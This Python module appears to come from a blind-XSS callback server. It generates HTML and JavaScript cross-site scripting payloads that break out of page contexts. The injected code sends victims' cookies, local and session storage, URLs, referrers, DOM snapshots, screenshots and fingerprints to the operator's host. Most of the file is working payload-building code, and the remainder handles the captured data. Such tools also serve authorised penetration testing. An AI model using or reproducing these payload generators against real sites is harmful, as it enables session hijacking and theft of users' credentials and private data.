import base64
import json
from typing import Dict, Hashable, Iterable, List

from app.api.validators.shared import ValidationException
from app.models import XSS, Client

PAYLOADS = {
    "cookies": 'cookies="+encodeURIComponent(document.cookie)+"',
    "local_storage": 'local_storage="+encodeURIComponent(JSON.stringify(localStorage))+"',
    "session_storage": 'session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))+"',
    "origin_url": 'origin_url="+encodeURIComponent(location.href)+"',
    "referrer": 'referrer="+encodeURIComponent(document.referrer)+"',
}


def generate_html_payload(request_body: Dict, client: Client) -> str:

    if "fingerprint" in request_body["data_to_gather"] or "dom" in request_body["data_to_gather"] or "screenshot" in request_body["data_to_gather"]:
        return generate_html_payload_with_complex_data(request_body, client)

    elif (
        "local_storage" in request_body["data_to_gather"]
        or "session_storage" in request_body["data_to_gather"]
        or "cookies" in request_body["data_to_gather"]
        or "origin_url" in request_body["data_to_gather"]
        or "referrer" in request_body["data_to_gather"]
    ):
        return generate_html_payload_with_simple_data(request_body, client)

    else:
        return generate_html_payload_without_data(request_body, client)


def generate_html_payload_with_complex_data(request_body: Dict, client: Client) -> str:

    payload_prefix = f'\'>"><script src={request_body["url"]}/static/collector.min.js></script><script>sendData("'

    payload_core = base64.b64encode(
        str.encode(
            json.dumps(
                {
                    "url": f"{request_body['url']}/api/x/{request_body['xss_type']}/{client.uid}",
                    "data_to_gather": request_body["data_to_gather"],
                    "tags": request_body["tags"],
                }
            )
        )
    ).decode()

    payload_suffix = '")</script>'

    return payload_prefix + payload_core + payload_suffix


def generate_html_payload_with_simple_data(request_body: Dict, client: Client) -> str:

    payload_prefix = f'\'>"><script>new Image().src="{request_body["url"]}/api/x/{request_body["xss_type"]}/{client.uid}?'

    if request_body["tags"]:
        tags_parameter = f"tags={','.join(request_body['tags'])}"
        data_to_gather_parameters = generate_data_to_gather_parameters(request_body["data_to_gather"])
        payload_core = "&".join([tags_parameter, data_to_gather_parameters])
    else:
        payload_core = generate_data_to_gather_parameters(request_body["data_to_gather"])

    payload_suffix = "</script>"

    return payload_prefix + payload_core + payload_suffix


def generate_html_payload_without_data(request_body: Dict, client: Client) -> str:

    payload_prefix = f'\'>"><img src="{request_body["url"]}/api/x/{request_body["xss_type"]}/{client.uid}'

    if request_body["tags"]:
        tags_parameter = f"tags={','.join(request_body['tags'])}"
        payload_core = f"?{tags_parameter}"
    else:
        payload_core = ""

    payload_suffix = '" />'

    return payload_prefix + payload_core + payload_suffix


def generate_javascript_payload(request_body: Dict, client: Client) -> str:

    if "fingerprint" in request_body["data_to_gather"] or "dom" in request_body["data_to_gather"] or "screenshot" in request_body["data_to_gather"]:
        return generate_javascript_payload_with_complex_data(request_body, client)

    elif not request_body["data_to_gather"]:
        return generate_javascript_payload_without_data(request_body, client)

    else:
        return generate_javascript_payload_with_simple_data(request_body, client)


def generate_javascript_payload_with_complex_data(request_body: Dict, client: Client) -> str:

    payload_prefix = f';}};var js=document.createElement("script");js.src="{request_body["url"]}/static/collector.min.js";js.onload=function(){{sendData("'

    payload_core = base64.b64encode(
        str.encode(
            json.dumps(
                {
                    "url": f"{request_body['url']}/api/x/{request_body['xss_type']}/{client.uid}",
                    "data_to_gather": request_body["data_to_gather"],
                    "tags": request_body["tags"],
                }
            )
        )
    ).decode()

    payload_suffix = '")};document.body.appendChild(js);'

    return payload_prefix + payload_core + payload_suffix


def generate_javascript_payload_with_simple_data(request_body: Dict, client: Client) -> str:

    payload_prefix = f';}};new Image().src="{request_body["url"]}/api/x/{request_body["xss_type"]}/{client.uid}'

    data_to_gather_parameters = generate_data_to_gather_parameters(request_body["data_to_gather"])

    if request_body["tags"]:
        tags_parameter = f"tags={','.join(request_body['tags'])}"
        payload_core = f"?{'&'.join([tags_parameter, data_to_gather_parameters])}"
    else:
        payload_core = f"?{data_to_gather_parameters}"

    payload_suffix = ";"

    return payload_prefix + payload_core + payload_suffix


def generate_javascript_payload_without_data(request_body: Dict, client: Client) -> str:

    payload_prefix = f';}};new Image().src="{request_body["url"]}/api/x/{request_body["xss_type"]}/{client.uid}'

    if request_body["tags"]:
        tags_parameter = f"tags={','.join(request_body['tags'])}"
        payload_core = f"?{tags_parameter}"
    else:
        payload_core = '"'

    payload_suffix = ";"

    return payload_prefix + payload_core + payload_suffix


def generate_data_to_gather_parameters(data_to_gather: Iterable[Hashable]) -> str:

    return "&".join([v for k, v in PAYLOADS.items() if k in data_to_gather]).rstrip('+"')


def generate_get_xss_list_filter_expression(query_parameters: Dict[Hashable, Hashable]) -> Dict[Hashable, Hashable]:

    filter_expression = {}

    if "client_id" in query_parameters:
        if not query_parameters["client_id"].isnumeric():
            raise ValidationException("Bad client ID")

        filter_expression["client_id"] = query_parameters["client_id"]

    if "type" in query_parameters:
        if query_parameters["type"] not in ["reflected", "stored"]:
            raise ValidationException("Unknown XSS type")

        filter_expression["xss_type"] = query_parameters["type"]

    return filter_expression


def generate_get_xss_captured_data_filter_expression(query_parameters: Dict[Hashable, Hashable]) -> Dict[Hashable, Hashable]:

    filter_expression = {}

    if "client_id" in query_parameters:
        if not query_parameters["client_id"].isnumeric():
            raise ValidationException("Bad client ID")

        filter_expression["client_id"] = query_parameters["client_id"]

    return filter_expression


def generate_captured_data_list(xss_list: Iterable[XSS]) -> List[Dict]:

    captured_data_list = []

    for xss in xss_list:
        captured_data = {"xss_id": xss.id, "tags": json.loads(xss.tags), "data": {}}
        for element_name, element_value in json.loads(xss.data).items():
            if element_name in ["fingerprint", "dom", "screenshot"]:
                captured_data["data"].update({element_name: ""})
            else:
                captured_data["data"].update({element_name: element_value})

        captured_data_list.append(captured_data)

    return captured_data_list
